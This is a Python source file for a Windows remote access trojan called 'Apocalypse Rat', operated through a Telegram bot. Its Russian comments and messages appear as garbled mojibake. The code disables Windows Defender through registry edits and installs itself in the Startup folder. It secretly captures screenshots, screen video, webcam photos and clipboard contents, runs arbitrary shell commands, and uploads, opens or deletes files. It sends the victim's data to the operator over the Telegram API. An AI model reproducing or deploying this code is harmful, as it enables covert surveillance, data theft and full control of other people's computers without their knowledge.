# ----------------------–û—Å–Ω–æ–≤–Ω—ã–µ –∏–º–ø–æ—Ä—Ç—ã--------------------#

import os
import random
import string

import cv2
import sys
import time
import shutil
import psutil
import ctypes
import telebot
import requests
import pymsgbox
import platform
import pyautogui
import pyperclip
import webbrowser
import subprocess
import numpy as np
import tkinter as tk


from tkinter import scrolledtext
from PIL import ImageGrab
from os import getlogin
from telebot import types
import win32com.client

# ----------------------–ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ--------------------#

bot_token = ""
adm = ""
bot = telebot.TeleBot(bot_token)
username = getlogin()
r = requests.get('https://ip.42.pl/raw')
IP = r.text
# -------------–û—Ç–∫–ª—é—á–µ–Ω–∏–µ WinDefender(–º–æ–∂–µ—Ç–µ —É–¥–∞–ª–∏—Ç—å)--#

os.system(r"""
set vers=15
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
spauses
""")

# -----------------------–§—É–Ω–∫—Ü–∏–∏-----------------------#

def screen():
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + f'\\Sreenshot.jpg')
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
    files = {'photo': screen}
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + adm, files=files)


def get_hwid():
    wmi = win32com.client.GetObject("winmgmts:")
    hwid = wmi.InstancesOf("Win32_ComputerSystemProduct")[0].UUID
    return hwid


def send_direct():
    directory = os.path.abspath(os.getcwd())
    bot.send_message(adm, "üìÇ\n" + str(directory))


def send_ls():
    try:
        dirs = '\n'.join(os.listdir(path="."))
        bot.send_message(adm, "Files: " + "\n" + dirs)
    except:
        bot.send_message(adm, "‚ùå –û—à–∏–±–∫–∞! —Ñ–∞–π–ª –≤–≤–µ–¥–µ–Ω –Ω–µ–≤–µ—Ä–Ω–æ!")


def send_info():
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version()
    bot.send_message(adm, f"PC: {username}\nIP: {IP}\nOS: {windows}\nProcessor: {processor}\nVersion OS : {systemali}")


def open_url(message):
    url = message.text
    try:
        webbrowser.open_new_tab(url)
        bot.send_message(adm, f"–°—Å—ã–ª–∫–∞ - {url} –æ—Ç–∫—Ä—ã—Ç–∞!")
        screen()
    except:
        bot.send_message(adm, "‚ùå –û—à–∏–±–∫–∞! —Å—Å—ã–ª–∫–∞ –≤–≤–µ–¥–µ–Ω–∞ –Ω–µ–≤–µ—Ä–Ω–æ!")


def messagebox(message):
    pass

def startup():
    try:
        shutil.copy2(sys.argv[0],
                     r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        bot.send_message(adm, f'{os.path.basename(sys.argv[0])} –°–∫–æ–ø–∏—Ä–æ–≤–∞–ª –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É')
        os.startfile(
            'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(
                sys.argv[0]))
        bot.send_message(adm, f'{os.path.basename(sys.argv[0])} –ó–∞–ø—É—â–µ–Ω –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏')
        bot.send_message(adm, '–ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å...')
    except:
        bot.send_message(adm, '–û—à–∏–±–∫–∞')


def send_tasklist():
    try:
        os.system('tasklist> C:\\ProgramData\\Tasklist.txt')
        tasklist = open('C:\\ProgramData\\Tasklist.txt')
        bot.send_document(adm, tasklist)
        tasklist.close()
        os.remove('C:\\ProgramData\\Tasklist.txt')
    except:
        bot.send_message(adm, 'Error > Tasklist')


def kill_process(message):
    process_name = message.text
    try:
        subprocess.call(f"taskkill /f /im {process_name}.exe")
        bot.send_message(adm, f"–ü—Ä–æ—Ü–µ—Å—Å {process_name} –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        screen()
    except:
        bot.send_message(adm, '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å –∫–æ–º–∞–Ω–¥—ã.\n–ü–æ–ø—Ä–æ–±—É–π\n/kill {–∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –±–µ–∑ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è}')


def handle_file_upload(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    save_path = os.path.join(os.getcwd(), message.document.file_name)
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)
    bot.send_message(adm, f"–§–∞–π–ª {message.document.file_name} –∑–∞–≥—Ä—É–∂–µ–Ω –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é {save_path}")


def open_file(message):
    file_path = message.text
    try:
        os.startfile(file_path)
        bot.send_message(adm, f"–§–∞–π–ª {file_path} —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç!")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞! –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª {file_path}. –ü—Ä–∏—á–∏–Ω–∞: {e}")


def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        bot.send_message(adm, f"üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n{clipboard_content}")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞: {e}")


def record_screen():
    try:
        screen_size = pyautogui.size()
        video_output = os.path.join(os.getenv("APPDATA"), "screen_record.mp4")

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(video_output, fourcc, 20.0, screen_size)

        start_time = time.time()

        while int(time.time() - start_time) < 15:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()

        video = open(video_output, 'rb')
        bot.send_video(adm, video)
        video.close()
        os.remove(video_output)
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {e}")

def execute_shell_command(message):
    command = message.text
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.send_message(adm, f"üñ•Ô∏è –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n```\n{stdout}\n```", parse_mode='Markdown')
        else:
            bot.send_message(adm, f"‚ö†Ô∏è –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –Ω–æ —Å –æ—à–∏–±–∫–æ–π:\n```\n{stderr}\n```", parse_mode='Markdown')

    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n```\n{e}\n```", parse_mode='Markdown')

def move_mouse(message):
    try:
        coordinates = message.text.split(',')
        x = int(coordinates[0].strip())
        y = int(coordinates[1].strip())
        pyautogui.moveTo(x, y)
        bot.send_message(adm, f"üñ±Ô∏è –ú—ã—à–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∞ –≤ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã ({x}, {y}).")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –º—ã—à–∫–∏: {e}")


def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()

        if not ret:
            bot.send_message(adm, "‚ùå –í–µ–±-–∫–∞–º–µ—Ä–∞ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞.")
            return

        img_path = os.path.join(os.getenv("APPDATA"), "webcam_photo.jpg")
        cv2.imwrite(img_path, frame)
        cam.release()

        img = open(img_path, 'rb')
        bot.send_photo(adm, img)
        os.remove(img_path)
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ —Å—ä–µ–º–∫–∏ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã: {e}")

def copy_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.copy2(src.strip(), dest.strip())
        bot.send_message(adm, f"üìÇ –§–∞–π–ª —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –∏–∑ {src.strip()} –≤ {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞: {e}")

def move_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.move(src.strip(), dest.strip())
        bot.send_message(adm, f"üìÇ –§–∞–π–ª –ø–µ—Ä–µ–º–µ—â–µ–Ω –∏–∑ {src.strip()} –≤ {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è —Ñ–∞–π–ª–∞: {e}")

def delete_file(message):
    try:
        file_path = message.text.strip()
        os.remove(file_path)
        bot.send_message(adm, f"üóëÔ∏è –§–∞–π–ª {file_path} —É–¥–∞–ª–µ–Ω.")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞: {e}")

def system_monitor():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        bot.send_message(adm, f"üìä –°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã:\n\n"
                              f"üíª –¶–ü: {cpu_usage}%\n"
                              f"üß† –ü–∞–º—è—Ç—å: {memory_info.percent}%\n"
                              f"üíΩ –î–∏—Å–∫: {disk_info.percent}%")
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–∏—Å—Ç–µ–º—ã: {e}")

def shutdown_pc():
    try:
        bot.send_message(adm, "‚è≥ –í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö...")
        os.system("shutdown /s /t 1")
    except Exception as e:
        bot.send_message(adm, f"‚ùå *–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è –ü–ö*: {e}")

def restart_pc():
    try:
        bot.send_message(adm, "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö...")
        os.system("shutdown /r /t 1")  # /r –æ–∑–Ω–∞—á–∞–µ—Ç –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É, /t 1 –æ–∑–Ω–∞—á–∞–µ—Ç –∑–∞–¥–µ—Ä–∂–∫—É –≤ 1 —Å–µ–∫—É–Ω–¥—É
    except Exception as e:
        bot.send_message(adm, f"‚ùå *–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –ü–ö*: {e}")

def ask_messagebox_title(message):
    title = message.text
    bot.send_message(adm, "üìù *–í–≤–µ–¥–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Messagebox*: ", parse_mode='Markdown')
    bot.register_next_step_handler(message, lambda msg: send_messagebox(title, msg.text))

def send_messagebox(title, description):
    try:
        bot.send_message(adm, f"‚úâÔ∏è *–°–æ–æ–±—â–µ–Ω–∏–µ* \"{title}\" –≤ *Messagebox –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ*!", parse_mode='Markdown')
        ctypes.windll.user32.MessageBoxW(0, description, title, 0x10 | 0x0)

    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Messagebox: {e}")

def prank_move_mouse():
    try:
        bot.send_message(adm, "üê≠ *–ü—Ä–∏–∫–æ–ª —Å –º—ã—à–∫–æ–π –Ω–∞—á–∞—Ç!*", parse_mode='Markdown')
        duration = 10  # –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
        start_time = time.time()
        while time.time() - start_time < duration:
            x, y = pyautogui.position()
            pyautogui.moveTo(x + 50, y, duration=0.5)
            time.sleep(0.5)
            pyautogui.moveTo(x - 100, y, duration=0.5)
            time.sleep(0.5)
        bot.send_message(adm, "üê≠ *–ü—Ä–∏–∫–æ–ª —Å –º—ã—à–∫–æ–π –∑–∞–≤–µ—Ä—à–µ–Ω!*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(adm, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –ø—Ä–∏–∫–æ–ª–∞ —Å –º—ã—à–∫–æ–π: {e}")

# -------------------–•–∞–Ω–¥–ª–µ—Ä—ã-------------------------#



bot.send_message(adm,f'ü•∏ {username} *–ü–æ–¥–∫–ª—é—á–∏–ª—Å—è*!\n\n```\nüíª Hwid: {get_hwid()}\nüõú Local Ip - {IP}\n```\nüí¨ *–ù–∞–∂–º–∏* /start *—á—Ç–æ–±—ã –≤–∑–∞–π–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å*.', parse_mode='Markdown')



@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    buttons = [
        types.InlineKeyboardButton("üìÇ –¢–µ–∫. –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è", callback_data='direct'),
        types.InlineKeyboardButton("üìÅ –§–∞–π–ª—ã –≤ —ç—Ç–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏", callback_data='ls'),
        types.InlineKeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data='screen'),
        types.InlineKeyboardButton("‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∫", callback_data='info'),
        types.InlineKeyboardButton("üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É", callback_data='openurl'),
        types.InlineKeyboardButton("üìå –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞", callback_data='startup'),
        types.InlineKeyboardButton("üìã –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤", callback_data='tasklist'),
        types.InlineKeyboardButton("‚ùå –£–±–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å", callback_data='kill'),
        types.InlineKeyboardButton("‚¨ÜÔ∏è –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª", callback_data='upload'),
        types.InlineKeyboardButton("üìÇ –û—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª", callback_data='openfile'),
        types.InlineKeyboardButton("üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞", callback_data='clipboard'),
        types.InlineKeyboardButton("üé• –í–∏–¥–µ–æ", callback_data='video'),
        types.InlineKeyboardButton("üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∏", callback_data='webcam_photo'),
        types.InlineKeyboardButton("üíª –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", callback_data='shutdown'),
        types.InlineKeyboardButton("üîÑÔ∏è –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö", callback_data='restart'),
        types.InlineKeyboardButton("üñ±Ô∏è –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –º—ã—à–∫—É", callback_data='move_mouse'),
        types.InlineKeyboardButton("üñ•Ô∏è –ö–æ–º–º–∞–Ω–¥–∞ shell", callback_data='shell'),
        types.InlineKeyboardButton("üìÅ –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª", callback_data='copy_file'),
        types.InlineKeyboardButton("üìÅ –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª", callback_data='move_file'),
        types.InlineKeyboardButton("üóëÔ∏è –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª", callback_data='delete_file'),
        types.InlineKeyboardButton("üìä –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–∏—Å—Ç–µ–º—ã", callback_data='system_monitor'),
        types.InlineKeyboardButton("üò∂ –í—ã–≤–µ—Å—Ç–∏ –æ—à–∏–±–∫—É", callback_data='messagebox'),
        types.InlineKeyboardButton("üñ±Ô∏è –ü—Ä–∏–∫–æ–ª —Å –º—ã—à–∫–æ–π", callback_data='mouseprank')
    ]
    keyboard.add(*buttons)
    mark = types.InlineKeyboardButton('üï≥Ô∏è Apocalypse Rat', callback_data='mark')
    keyboard.add(mark)
    bot.send_message(adm, 'üõú –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.', reply_markup=keyboard)




@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'direct':
        send_direct()

    elif call.data == 'ls':
        send_ls()

    elif call.data == 'screen':
        screen()

    elif call.data == 'info':
        send_info()

    elif call.data == 'openurl':
        bot.send_message(adm, "üîó *–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, open_url)

    elif call.data == 'startup':
        startup()

    elif call.data == 'tasklist':
        send_tasklist()

    elif call.data == 'kill':
        bot.send_message(adm, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, kill_process)

    elif call.data == 'upload':
        bot.send_message(adm, "üìÇ *–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, handle_file_upload)

    elif call.data == 'mouseprank':
        prank_move_mouse()

    elif call.data == 'openfile':
        bot.send_message(adm, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É*:", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, open_file)

    elif call.data == 'clipboard':
        get_clipboard()


    elif call.data == 'video':
        bot.send_message(adm, 'üé• *–ó–∞–ø–∏—Å—ã–≤–∞—é –≤–∏–¥–µ–æ*...', parse_mode='Markdown')
        record_screen()

    elif call.data == 'messagebox':
        bot.send_message(adm, "üìù *–í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Messagebox*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, ask_messagebox_title)

    elif call.data == 'webcam_photo':
        capture_webcam()

    elif call.data == 'shutdown':
        shutdown_pc()
    elif call.data == 'restart':
        restart_pc()
    elif call.data == 'shell':
        bot.send_message(adm, "üñ•Ô∏è *–í–≤–µ–¥–∏—Ç–µ shell –∫–æ–º–∞–Ω–¥—É*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, execute_shell_command)
    elif call.data == 'move_mouse':
        bot.send_message(adm, "üñ±Ô∏è *–í–≤–µ–¥–∏—Ç–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –º—ã—à–∫–∏ (x, y)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, move_mouse)
    elif call.data == 'copy_file':
        bot.send_message(adm, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –∏—Å—Ö–æ–¥–Ω—ã–π –∏ —Ü–µ–ª–µ–≤–æ–π –ø—É—Ç—å (src, dest)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, copy_file)
    elif call.data == 'move_file':
        bot.send_message(adm, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –∏—Å—Ö–æ–¥–Ω—ã–π –∏ —Ü–µ–ª–µ–≤–æ–π –ø—É—Ç—å (src, dest)*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, move_file)
    elif call.data == 'delete_file':
        bot.send_message(adm, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è*: ", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, delete_file)

    elif call.data == 'system_monitor':
        system_monitor()
    elif call.data == 'mark':
        bot.send_message(adm, f'üï≥Ô∏è *Apocalypse Rat*\n\n*GitHub* - \n\nüÜö*–í–µ—Ä—Å–∏—è –∫–ª–∏–µ–Ω—Ç–∞* - 0.0.2 BetaRls\nü´Ç*–¢–µ–∫—É—â–∏–π –∫–ª–∏–µ–Ω—Ç* - {getlogin()}', parse_mode='Markdown')


while True:
    try:
        bot.polling()
    except:
        time.sleep(1)
        bot.polling()
